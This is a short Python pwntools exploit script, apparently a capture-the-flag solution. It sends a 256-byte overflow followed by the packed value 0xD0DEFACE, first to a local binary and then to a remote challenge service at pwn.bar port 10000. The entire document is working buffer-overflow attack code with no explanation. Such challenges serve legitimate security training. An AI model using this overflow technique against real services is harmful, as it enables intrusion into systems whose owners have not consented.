from pwn import *

# Payload
overflow = b"a" * 256
include = p32(0xD0DEFACE)

def local():
    # Test local
    # Connect
    con = process('./binary')
    # Start
    print(con.recv().decode())
    con.sendline(overflow + include)
    print(con.recv().decode())
    #It's work, go to nc

def nc():
    # NC
    con = remote('pwn.bar',10000)
    # Start
    print(con.recv().decode())
    con.sendline(overflow + include)
    print(con.recv().decode())

#local()
nc()